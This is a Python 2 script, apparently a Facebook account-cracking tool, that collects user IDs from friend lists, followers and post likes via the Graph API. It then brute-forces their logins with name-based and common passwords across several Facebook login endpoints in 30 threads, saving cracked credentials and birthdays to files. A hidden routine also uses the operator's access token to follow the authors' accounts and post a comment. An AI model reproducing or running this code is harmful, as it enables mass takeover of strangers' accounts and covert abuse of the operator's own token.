#!/usr/bin/python
# -*- coding: utf-8
# Coding by Rishu Khan
# WhatsAp me +919934594540
fb = 'Rushu 3:)'
import os,sys,time,datetime,random,hashlib,re,threading,json,cookielib,requests,uuid,itertools,subprocess
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
from random import randint
try:
	import requests
except ImportError:
	print ' !: Modul requests belum terinstal !...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')

                   ######################
                   #        Open source code          #
                   ######################
                   
#              
# Recode? gk masalah. asalkan jgn ubah bot nya bro :) kalau bisa cantumkan nama gw :)
# Script udah enak jangan di ubah" lagi nanti error
#

ip = requests.get('https://api.ipify.org').text
# Mohon tidak untuk di ubah #
def logo():
	print("""                  
\033[1;92m███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗     
\033[1;92m████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║    
\033[1;92m██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║    
\033[1;92m██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║      
\033[1;92m██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝      
\033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░      

\033[1;94m  ╔════════════════•\033[1;93mBaby Dragon\033[1;94m•═══════════╗
\033[1;94m  █ \033[1;91m [\033[1;91m✓] \033[1;96mAuthor    : \033[1;95mMarMu                 \033[1;94m█ 
\033[1;94m  █ \033[1;91m [\033[1;91m✓] \033[1;96mFacebook  : \033[1;95mTechonology By MarMu  \033[1;94m█ 
\033[1;94m  █ \033[1;91m [\033[1;91m✓] \033[1;96mGitHub    : \033[1;95mBaby Dragon           \033[1;94m█ 
\033[1;94m  █ \033[1;91m [\033[1;91m✓] \033[1;96mGroup     :\033[1;95mTermux Hacker Team     \033[1;94m█ 
\033[1;94m  ╚═══════════════════•\033[1;93mᗰᗩᖇᗰᑌ\033[1;94m•══════════════╝""""") 
  
 
kom = 'login'
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
api="https://b-api.facebook.com/method/auth.login"
useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]'

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']

   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}


def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		ngentod = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print ('\033[0;91m !: Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		x_()
	except requests.exceptions.ConnectionError:
		print ('\033[0;91m [•] No Connection')
		sys.exit()
	logo()
	print"\033[0;97m Name\033[0;92m " +ngentod
	print
        print(" \033[0;93m══════════════🍁═══════════════════")
	print" \033[0;92m(01). \033[0;96mCrack from public Id"
	print" \033[0;92m(02). \033[0;96mCrack from followers"
	print" \033[0;92m(03). \033[0;96mCrack name search"
	print" \033[0;92m(04). \033[0;96mCheck results "
	print" \033[0;92m(00). \033[0;96m\033[0;97m Remove token"
	print(" \033[0;93m════════════🍁════🍁═══════════════")
	pilih_menu()

def pilih_menu():
	mi = raw_input("\n\033[0;97m [•] choose : ")
	if mi == "":
		print
		print ("\033[0;91m [•] Fill in correctly") 
		exit()
	elif mi in['1','01']:
		print ("\n \033[0;92m[•] Type 'me' to crack your own friend list") 
		idt = raw_input(" \033[0;92m[•] Id Public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		except KeyError:
			print ("\033[0;91m [•] Id not public") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif mi in['2','02']:
		print ("\n \033[0;92m[•] Type 'me' to crack your own followers") 
		idt = raw_input("\033[0;92m ?: Id Public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		except KeyError:
			print (" \033[0;91m[•] Id not public") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif mi in['33','003']:
		idt = raw_input("\033[0;92m [•] Public Post Id link : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif mi in['4','04']:
		print"\n\033[0;92m (01). Check OK Ids"
		print"\n\033[0;91m (02). Check CP Ids"
		ajg = raw_input("\n \033[0;92m[•] choose : ")
		if ajg =="":
			menu()
		elif ajg in['1','01']:
			print ("\n\033[0;97m [•] results \033[0;92mOK\033[0;91m date : %s-%s-%s\033[0;92m\n" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ajg in['2','02']:
			print ("\n\033[0;97m [•] results \033[0;91mCP\033[0;91m date : %s-%s-%s\033[0;91m\n" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		else:
			exit("\033[0;91m [•] choose the right one") 
	elif mi == "0" or mi == "00":
		os.system("rm -f login.txt") 
		print (" \033[0;92m√  successfully deleted token") 
		exit()
	else:
		print ("\033[0;91m [•] choose the right one ") 
		exit()
	
	print"\033[0;92m [•] total id  : " +str(len(id))
	anak_memek() 

# Tambahan metode nya #
def anak_memek():
        print(" \033[0;94m═══════════════ MarMu ═════════════════")
	print ("\n\033[0;92m [ Select the crack method ] \n")
	print ("\n\033[0;93m (01). \033[0;92m (fast)")
	print ("\n\033[0;93m (02). \033[0;92m (normal)")
	print ("\n\033[0;93m (03). \033[0;92m (slow)")
	print(" \033[0;94m══════════════ Baby Dragon ═════════════")
	romixyz()

def romixyz():
	rom = raw_input("\n \033[0;91m[•] choose : ")
	if rom =='':
		print ("\033[0;91m [•] choose the right one ")
		romixyz()
	elif rom in['1','01']:
		romi_ganteng()
	elif rom in['2','02']:
		romi_gntg()
	elif rom in['3','03']:
		romi_rzl()
	else:
		print ("\033[0;91m [•] choose the right one ")
		romixyz()
	
# Metode api #
def romi_ganteng():
	romi = raw_input("\033[0;95m [•] Hack Password Manually or Auto? M/A : ")
	if romi=='':
		print ("\033[0;91m [•] choose the right one ") 
		romi_ganteng()
	elif romi in['m','M']:
		manualbapi()
	elif romi in['a','A']:
		langsungapi()
	else:
		print ("\033[0;91m [•] choose the right one ") 
		romi_ganteng()
		
def langsungapi():
	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use airplane mode 10 second\n")
	
	def main(arg):
		global ok,cp,ua, loop
		d = random.choice(["\033[0;91m","\033[0;92m","\033[0;93m","\033[0;94m","\033[0;95m","\033[0;96m","\033[0;91m"])
		print '\r '+d+'[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'12345','sayang','anjing','786786']:
				#upi = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
				yuy = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
				rx = random.choice(['Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]','Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0.0.33.120;]','Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g'])
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': yuy, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=kontol)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r \033[0;92m[MARMU-OK√] ' +uid+ ' ◊ ' + pw + '        '
					ok.append(uid+' ◊ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data["birthday"]
						print('\r\033[0;31m [MARMU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl )
						cp.append(uid+' ◊ '+pw+ ' ◊ ' +ttl )
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print ('\r\033[0;31m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        ')
					cp.append(uid+' ◊ '+pw )
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print
	exit()

def manualbapi():
	print("\n\033[0;95m [•] example pass : 123456,222222")
	pw = raw_input(" \033[0;92m?: password : ").split(",")
	if len(pw) ==0:
		exit("\033[0;91m [•] cannot be empty")
		
	print("\n \033[0;93m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
	
	def main(arg):
		global ok,cp,ua,loop
		d = random.choice(["\033[0;91m","\033[0;92m","\033[0;93m","\033[0;94m","\033[0;95m","\033[0;96m","\033[0;91m"])
		print '\r '+d+'[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") #Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				upi = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)'
				yuy = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': yuy, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=kontol)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;92m [RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
					ok.append(uid+' ◊ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
						cp.append(uid+' ◊ '+pw+'◊'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;31m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        '
					cp.append(uid+' ◊ '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print
	exit()
	
# Metode mbasic #
def romi_gntg():
	romi = raw_input("\033[0;95m [•] Use manual password? M/A : ")
	if romi=='':
		print ("\033[0;91m [•] choose the right one ") 
		romi_gntg()
	elif romi in['m','M']:
		manualbasic()
	elif romi in['a','A']:
		langsungbasic()
	else:
		print ("\033[0;91m [•] choose the right one ") 
		romi_gntg()
		
def langsungbasic():
	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
	
	def main(user):
		global loop, token,ok,cp,ua
		skm = []
		d = random.choice(["\033[0;91m","\033[0;92m","\033[0;93m","\033[0;94m","\033[0;95m","\033[0;96m","\033[0;91m"])
		print '\r '+d+'[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		try:os.mkdir("out")
		except OSError:pass
		uid,name=user.split("|")
		for nama in name.split(" "):
			if len(nama)<3:
				continue
			else:
				if len(nama) == 1 and len(nama) == 2 and len(nama) == 3 and len(nama) == 4 or len(nama) == 5:
				        skm.append(nama+"123")
#                                       skm.append(nama+"1234")
					skm.append(nama+"12345")
				else:
					skm.append(nama+"12")
					skm.append(nama+"123")
					skm.append(nama+"12345")
					skm.append(nama+"1234")
					skm.append(nama+"969")
					skm.append(nama+"007")
					skm.append(nama+"1500")
					skm.append("969969")
					skm.append("223344")
					skm.append("654321")
					skm.append("528528")
		try:
			for pw in skm:
				ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print '\r \033[0;92m[RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
					ok.append(uid+' ◊ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
						cp.append(uid+' ◊ '+pw+' ◊ '+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;91m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        '
					cp.append(uid+' ◊ '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print
	exit()

def manualbasic():
	print("\n\033[0;91m [•]  example pass : komarmu,123456")
	pw = raw_input(" \033[0;92m?: password : ").split(",")
	if len(pw) ==0:
		exit("\033[0;91m [•] cannot be empty")
		
	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
	
	def main(arg):
		global ok,cp,ua,loop,token
		d = random.choice(["\033[0;91m","\033[0;92m","\033[0;93m","\033[0;94m","\033[0;95m","\033[0;96m","\033[0;91m"])
		print '\r'+d+' [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") #Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print '\r\033[0;92m [RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
					ok.append(uid+' ◊ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
						cp.append(uid+' ◊ '+pw+'•'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
					cp.append(uid+' ◊ '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print
	exit()
	
# Metode Mobile #
def romi_rzl():
	romi = raw_input("\033[0;92m [•] Use manual password? C/A : ")
	if romi=='':
		print ("\033[0;91m [•] choose the right one ") 
		romi_rzl()
	elif romi in['t','C']:
		m_fb()
	elif romi in['c','C']:
		mobile()
	else:
		print ("\033[0;91m [•] choose the right one ") 
		romi_rzl()
		
def mobile():
	print("\n \033[0;92m[•] crack started...\n")
	
	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[0;92m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'12345','sayang','786786']:
				rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mobile_logout_button' in xo or 'save-device' in xo:
					print '\r \033[0;92m[RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
					ok.append(uid+' ◊ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
						cp.append(uid+' ◊ '+pw+' ◊ '+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
					cp.append(uid+' ◊ '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print
	exit()

def m_fb():
	print("\n\033[0;91m [•] example pass : 123456,528528")
	pw = raw_input(" \033[0;97m?: password : ").split(",")
	if len(pw) ==0:
		print("\033[0;91m [•] cannot be empty")
		m_fb()
		
	print("\n \033[0;92m[•] crack started...\n")
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r\033[0;92m [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") #Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mobile_logout_button' in xo or 'save-device' in xo:
					print '\r\033[0;92m [MARMU-OK√] ' +uid+ ' ◊ ' + pw + '        '
					ok.append(uid+' ◊ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;91m [MARMU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
						cp.append(uid+' ◊ '+pw+'•'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;91m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        '
					cp.append(uid+' ◊ '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print
	exit()

# Jangan di ganti ajg. boleh nambah :) #
def login_xx():
    try:
        romz = open('login.txt', 'r').read()
    except IOError:
        print ('\033[0;91m [•] Token invalid') 
        os.system('rm -rf login.txt')
        
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz) 
    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz) # Akun 2007
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz) # Romi Afrizal 2018
    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + romz) # Romi Afrizal 2021
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + romz) # Iqbal Bobz
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz) # Iwan Hadiansyah
    menu()

def x_():
	os.system('git pull')
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		logo()
		token = raw_input(" ?: token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			lampung = open("login.txt", 'w')
			lampung.write(token)
			lampung.close()
			print ("\033[0;92m √ login successful ")
			login_xx()
		except KeyError:
			print ("\033[0;91m [•] Token Invalid") 
			sys.exit()
			
x_()
